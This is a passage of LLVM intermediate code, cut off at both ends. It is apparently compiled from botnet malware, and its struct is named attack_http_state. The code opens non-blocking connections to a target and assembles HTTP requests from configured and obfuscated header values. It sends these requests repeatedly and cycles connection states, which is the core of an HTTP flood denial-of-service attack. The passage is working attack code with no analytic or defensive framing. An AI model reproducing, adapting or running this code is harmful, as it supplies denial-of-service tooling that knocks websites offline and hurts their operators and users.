  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 4
  %441 = call i32 (i32, i32, ...) @fcntl(i32 noundef %440, i32 noundef 3, i32 noundef 0)
  %442 = or i32 2048, %441
  %443 = call i32 (i32, i32, ...) @fcntl(i32 noundef %437, i32 noundef 4, i32 noundef %442)
  store i32 65535, i32* %10, align 4
  %444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %444, i32 0, i32 0
  %446 = load i32, i32* %445, align 4
  %447 = bitcast i32* %10 to i8*
  %448 = call i32 @setsockopt(i32 noundef %446, i32 noundef 0, i32 noundef 8, i8* noundef %447, i32 noundef 4) #6
  %449 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %449, align 4
  %450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %450, i32 0, i32 4
  %452 = load i32, i32* %451, align 4
  %453 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %454 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %453, i32 0, i32 0
  store i32 %452, i32* %454, align 4
  %455 = load i16, i16* %19, align 2
  %456 = call zeroext i16 @htons(i16 noundef zeroext %455) #7
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %456, i16* %457, align 2
  %458 = load i32, i32* %27, align 4
  %459 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 2
  store i32 %458, i32* %460, align 4
  %461 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %462 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %461, i32 0, i32 1
  store i8 2, i8* %462, align 4
  %463 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %463, i32 0, i32 0
  %465 = load i32, i32* %464, align 4
  %466 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %467 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %467, %struct.sockaddr** %466, align 8
  %468 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %469 = load %struct.sockaddr*, %struct.sockaddr** %468, align 8
  %470 = call i32 @connect(i32 noundef %465, %struct.sockaddr* %469, i32 noundef 16)
  %471 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %471, i32 0, i32 0
  %473 = load i32, i32* %472, align 4
  %474 = srem i32 %473, 64
  %475 = zext i32 %474 to i64
  %476 = shl i64 1, %475
  %477 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 4
  %481 = sdiv i32 %480, 64
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds [16 x i64], [16 x i64]* %477, i64 0, i64 %482
  %484 = load i64, i64* %483, align 8
  %485 = or i64 %484, %476
  store i64 %485, i64* %483, align 8
  %486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %486, i32 0, i32 0
  %488 = load i32, i32* %487, align 4
  %489 = load i32, i32* %23, align 4
  %490 = icmp sgt i32 %488, %489
  br i1 %490, label %491, label %496

491:                                              ; preds = %434
  %492 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %493 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %492, i32 0, i32 0
  %494 = load i32, i32* %493, align 4
  %495 = add nsw i32 %494, 1
  store i32 %495, i32* %23, align 4
  br label %496

496:                                              ; preds = %491, %434
  br label %955

497:                                              ; preds = %411
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i32 0, i32 1
  %500 = load i8, i8* %499, align 4
  %501 = zext i8 %500 to i32
  %502 = icmp eq i32 %501, 2
  br i1 %502, label %503, label %546

503:                                              ; preds = %497
  %504 = load i32, i32* %27, align 4
  %505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %505, i32 0, i32 2
  %507 = load i32, i32* %506, align 4
  %508 = sub i32 %504, %507
  %509 = icmp ugt i32 %508, 30
  br i1 %509, label %510, label %519

510:                                              ; preds = %503
  %511 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %511, i32 0, i32 1
  store i8 0, i8* %512, align 4
  %513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %513, i32 0, i32 0
  %515 = load i32, i32* %514, align 4
  %516 = call i32 @close(i32 noundef %515)
  %517 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %518 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %517, i32 0, i32 0
  store i32 -1, i32* %518, align 4
  br label %956

519:                                              ; preds = %503
  %520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %520, i32 0, i32 0
  %522 = load i32, i32* %521, align 4
  %523 = srem i32 %522, 64
  %524 = zext i32 %523 to i64
  %525 = shl i64 1, %524
  %526 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %527 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %528 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %527, i32 0, i32 0
  %529 = load i32, i32* %528, align 4
  %530 = sdiv i32 %529, 64
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds [16 x i64], [16 x i64]* %526, i64 0, i64 %531
  %533 = load i64, i64* %532, align 8
  %534 = or i64 %533, %525
  store i64 %534, i64* %532, align 8
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 4
  %538 = load i32, i32* %23, align 4
  %539 = icmp sgt i32 %537, %538
  br i1 %539, label %540, label %545

540:                                              ; preds = %519
  %541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %541, i32 0, i32 0
  %543 = load i32, i32* %542, align 4
  %544 = add nsw i32 %543, 1
  store i32 %544, i32* %23, align 4
  br label %545

545:                                              ; preds = %540, %519
  br label %954

546:                                              ; preds = %497
  %547 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %547, i32 0, i32 1
  %549 = load i8, i8* %548, align 4
  %550 = zext i8 %549 to i32
  %551 = icmp eq i32 %550, 4
  br i1 %551, label %552, label %826

552:                                              ; preds = %546
  %553 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %554 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %553, i32 0, i32 14
  store i32 -1, i32* %554, align 4
  %555 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %555, i32 0, i32 11
  store i32 0, i32* %556, align 4
  %557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 18
  %559 = getelementptr inbounds [1024 x i8], [1024 x i8]* %558, i64 0, i64 0
  call void @util_zero(i8* noundef %559, i32 noundef 1024)
  %560 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %560, i32 0, i32 17
  store i32 0, i32* %561, align 4
  %562 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  call void @util_zero(i8* noundef %562, i32 noundef 10240)
  %563 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %564 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %565 = call i32 @util_strlen(i8* noundef %564)
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds i8, i8* %563, i64 %566
  %568 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %569 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %568, i32 0, i32 9
  %570 = getelementptr inbounds [9 x i8], [9 x i8]* %569, i64 0, i64 0
  %571 = call i32 @util_strcpy(i8* noundef %567, i8* noundef %570)
  %572 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %573 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %574 = call i32 @util_strlen(i8* noundef %573)
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds i8, i8* %572, i64 %575
  %577 = call i32 @util_strcpy(i8* noundef %576, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %578 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %579 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %580 = call i32 @util_strlen(i8* noundef %579)
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds i8, i8* %578, i64 %581
  %583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %583, i32 0, i32 6
  %585 = getelementptr inbounds [257 x i8], [257 x i8]* %584, i64 0, i64 0
  %586 = call i32 @util_strcpy(i8* noundef %582, i8* noundef %585)
  %587 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %588 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %589 = call i32 @util_strlen(i8* noundef %588)
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds i8, i8* %587, i64 %590
  %592 = call i32 @util_strcpy(i8* noundef %591, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %593 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %594 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %595 = call i32 @util_strlen(i8* noundef %594)
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds i8, i8* %593, i64 %596
  %598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %598, i32 0, i32 5
  %600 = getelementptr inbounds [512 x i8], [512 x i8]* %599, i64 0, i64 0
  %601 = call i32 @util_strcpy(i8* noundef %597, i8* noundef %600)
  %602 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %603 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %604 = call i32 @util_strlen(i8* noundef %603)
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds i8, i8* %602, i64 %605
  %607 = call i32 @util_strcpy(i8* noundef %606, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %608 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %609 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %610 = call i32 @util_strlen(i8* noundef %609)
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds i8, i8* %608, i64 %611
  %613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %613, i32 0, i32 7
  %615 = getelementptr inbounds [129 x i8], [129 x i8]* %614, i64 0, i64 0
  %616 = call i32 @util_strcpy(i8* noundef %612, i8* noundef %615)
  %617 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %618 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %619 = call i32 @util_strlen(i8* noundef %618)
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds i8, i8* %617, i64 %620
  %622 = call i32 @util_strcpy(i8* noundef %621, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 39)
  %623 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %624 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %625 = call i32 @util_strlen(i8* noundef %624)
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds i8, i8* %623, i64 %626
  %628 = call i8* @table_retrieve_val(i32 noundef 39, i32* noundef null)
  %629 = call i32 @util_strcpy(i8* noundef %627, i8* noundef %628)
  call void @table_lock_val(i8 noundef zeroext 39)
  %630 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %631 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %632 = call i32 @util_strlen(i8* noundef %631)
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds i8, i8* %630, i64 %633
  %635 = call i32 @util_strcpy(i8* noundef %634, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 40)
  %636 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %637 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %638 = call i32 @util_strlen(i8* noundef %637)
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds i8, i8* %636, i64 %639
  %641 = call i8* @table_retrieve_val(i32 noundef 40, i32* noundef null)
  %642 = call i32 @util_strcpy(i8* noundef %640, i8* noundef %641)
  call void @table_lock_val(i8 noundef zeroext 40)
  %643 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %644 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %645 = call i32 @util_strlen(i8* noundef %644)
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds i8, i8* %643, i64 %646
  %648 = call i32 @util_strcpy(i8* noundef %647, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 noundef zeroext 41)
  %649 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %650 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %651 = call i32 @util_strlen(i8* noundef %650)
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds i8, i8* %649, i64 %652
  %654 = call i8* @table_retrieve_val(i32 noundef 41, i32* noundef null)
  %655 = call i32 @util_strcpy(i8* noundef %653, i8* noundef %654)
  call void @table_lock_val(i8 noundef zeroext 41)
  %656 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %657 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %658 = call i32 @util_strlen(i8* noundef %657)
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds i8, i8* %656, i64 %659
  %661 = call i32 @util_strcpy(i8* noundef %660, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %662 = load i8*, i8** %14, align 8
  %663 = icmp ne i8* %662, null
  br i1 %663, label %664, label %705

664:                                              ; preds = %552
  call void @table_unlock_val(i8 noundef zeroext 42)
  %665 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %667 = call i32 @util_strlen(i8* noundef %666)
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds i8, i8* %665, i64 %668
  %670 = call i8* @table_retrieve_val(i32 noundef 42, i32* noundef null)
  %671 = call i32 @util_strcpy(i8* noundef %669, i8* noundef %670)
  call void @table_lock_val(i8 noundef zeroext 42)
  %672 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %673 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %674 = call i32 @util_strlen(i8* noundef %673)
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds i8, i8* %672, i64 %675
  %677 = call i32 @util_strcpy(i8* noundef %676, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %678 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %679 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %680 = call i32 @util_strlen(i8* noundef %679)
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds i8, i8* %678, i64 %681
  %683 = call i8* @table_retrieve_val(i32 noundef 47, i32* noundef null)
  %684 = call i32 @util_strcpy(i8* noundef %682, i8* noundef %683)
  %685 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %686 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %687 = call i32 @util_strlen(i8* noundef %686)
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds i8, i8* %685, i64 %688
  %690 = call i32 @util_strcpy(i8* noundef %689, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %691 = load i8*, i8** %14, align 8
  %692 = call i32 @util_strlen(i8* noundef %691)
  %693 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %694 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %695 = call i32 @util_strlen(i8* noundef %694)
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds i8, i8* %693, i64 %696
  %698 = call i8* @util_itoa(i32 noundef %692, i32 noundef 10, i8* noundef %697)
  %699 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %700 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %701 = call i32 @util_strlen(i8* noundef %700)
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds i8, i8* %699, i64 %702
  %704 = call i32 @util_strcpy(i8* noundef %703, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %705

705:                                              ; preds = %664, %552
  %706 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %707 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %706, i32 0, i32 15
  %708 = load i32, i32* %707, align 4
  %709 = icmp sgt i32 %708, 0
  br i1 %709, label %710, label %752

710:                                              ; preds = %705
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %713 = call i32 @util_strlen(i8* noundef %712)
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds i8, i8* %711, i64 %714
  %716 = call i32 @util_strcpy(i8* noundef %715, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %10, align 4
  br label %717

717:                                              ; preds = %742, %710
  %718 = load i32, i32* %10, align 4
  %719 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %720 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %719, i32 0, i32 15
  %721 = load i32, i32* %720, align 4
  %722 = icmp slt i32 %718, %721
  br i1 %722, label %723, label %745

723:                                              ; preds = %717
  %724 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %725 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %726 = call i32 @util_strlen(i8* noundef %725)
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds i8, i8* %724, i64 %727
  %729 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %730 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %729, i32 0, i32 16
  %731 = load i32, i32* %10, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %730, i64 0, i64 %732
  %734 = getelementptr inbounds [128 x i8], [128 x i8]* %733, i64 0, i64 0
  %735 = call i32 @util_strcpy(i8* noundef %728, i8* noundef %734)
  %736 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %737 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %738 = call i32 @util_strlen(i8* noundef %737)
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds i8, i8* %736, i64 %739
  %741 = call i32 @util_strcpy(i8* noundef %740, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  br label %742

742:                                              ; preds = %723
  %743 = load i32, i32* %10, align 4
  %744 = add nsw i32 %743, 1
  store i32 %744, i32* %10, align 4
  br label %717, !llvm.loop !11

745:                                              ; preds = %717
  %746 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %747 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %748 = call i32 @util_strlen(i8* noundef %747)
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds i8, i8* %746, i64 %749
  %751 = call i32 @util_strcpy(i8* noundef %750, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %752

752:                                              ; preds = %745, %705
  %753 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %754 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %755 = call i32 @util_strlen(i8* noundef %754)
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %753, i64 %756
  %758 = call i32 @util_strcpy(i8* noundef %757, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %759 = load i8*, i8** %14, align 8
  %760 = icmp ne i8* %759, null
  br i1 %760, label %761, label %769

761:                                              ; preds = %752
  %762 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %763 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %764 = call i32 @util_strlen(i8* noundef %763)
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds i8, i8* %762, i64 %765
  %767 = load i8*, i8** %14, align 8
  %768 = call i32 @util_strcpy(i8* noundef %766, i8* noundef %767)
  br label %769

769:                                              ; preds = %761, %752
  %770 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %771 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %770, i32 0, i32 9
  %772 = getelementptr inbounds [9 x i8], [9 x i8]* %771, i64 0, i64 0
  %773 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %773, i32 0, i32 10
  %775 = getelementptr inbounds [9 x i8], [9 x i8]* %774, i64 0, i64 0
  %776 = call signext i8 @util_strcmp(i8* noundef %772, i8* noundef %775)
  %777 = icmp ne i8 %776, 0
  br i1 %777, label %786, label %778

778:                                              ; preds = %769
  %779 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %780 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %779, i32 0, i32 9
  %781 = getelementptr inbounds [9 x i8], [9 x i8]* %780, i64 0, i64 0
  %782 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %783 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %782, i32 0, i32 10
  %784 = getelementptr inbounds [9 x i8], [9 x i8]* %783, i64 0, i64 0
  %785 = call i32 @util_strcpy(i8* noundef %781, i8* noundef %784)
  br label %786

786:                                              ; preds = %778, %769
  %787 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %788 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 4
  %790 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %791 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %792 = call i32 @util_strlen(i8* noundef %791)
  %793 = sext i32 %792 to i64
  %794 = call i64 @send(i32 noundef %789, i8* noundef %790, i64 noundef %793, i32 noundef 16384)
  %795 = load i32, i32* %27, align 4
  %796 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %796, i32 0, i32 3
  store i32 %795, i32* %797, align 4
  %798 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %799 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %798, i32 0, i32 1
  store i8 6, i8* %799, align 4
  %800 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %801 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %800, i32 0, i32 0
  %802 = load i32, i32* %801, align 4
  %803 = srem i32 %802, 64
  %804 = zext i32 %803 to i64
  %805 = shl i64 1, %804
  %806 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %807 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %807, i32 0, i32 0
  %809 = load i32, i32* %808, align 4
  %810 = sdiv i32 %809, 64
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds [16 x i64], [16 x i64]* %806, i64 0, i64 %811
  %813 = load i64, i64* %812, align 8
  %814 = or i64 %813, %805
  store i64 %814, i64* %812, align 8
  %815 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %816 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %815, i32 0, i32 0
  %817 = load i32, i32* %816, align 4
  %818 = load i32, i32* %23, align 4
  %819 = icmp sgt i32 %817, %818
  br i1 %819, label %820, label %825

820:                                              ; preds = %786
  %821 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 4
  %824 = add nsw i32 %823, 1
  store i32 %824, i32* %23, align 4
  br label %825

825:                                              ; preds = %820, %786
  br label %953

826:                                              ; preds = %546
  %827 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %827, i32 0, i32 1
  %829 = load i8, i8* %828, align 4
  %830 = zext i8 %829 to i32
  %831 = icmp eq i32 %830, 6
  br i1 %831, label %832, label %859

832:                                              ; preds = %826
  %833 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %834 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %833, i32 0, i32 0
  %835 = load i32, i32* %834, align 4
  %836 = srem i32 %835, 64
  %837 = zext i32 %836 to i64
  %838 = shl i64 1, %837
  %839 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %840 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %841 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 4
  %843 = sdiv i32 %842, 64
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [16 x i64], [16 x i64]* %839, i64 0, i64 %844
  %846 = load i64, i64* %845, align 8
  %847 = or i64 %846, %838
  store i64 %847, i64* %845, align 8
  %848 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %848, i32 0, i32 0
  %850 = load i32, i32* %849, align 4
  %851 = load i32, i32* %23, align 4
  %852 = icmp sgt i32 %850, %851
  br i1 %852, label %853, label %858

853:                                              ; preds = %832
  %854 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 4
  %857 = add nsw i32 %856, 1
  store i32 %857, i32* %23, align 4
  br label %858

858:                                              ; preds = %853, %832
  br label %952

859:                                              ; preds = %826
  %860 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %861 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %860, i32 0, i32 1
  %862 = load i8, i8* %861, align 4
  %863 = zext i8 %862 to i32
  %864 = icmp eq i32 %863, 7
  br i1 %864, label %865, label %892

865:                                              ; preds = %859
  %866 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
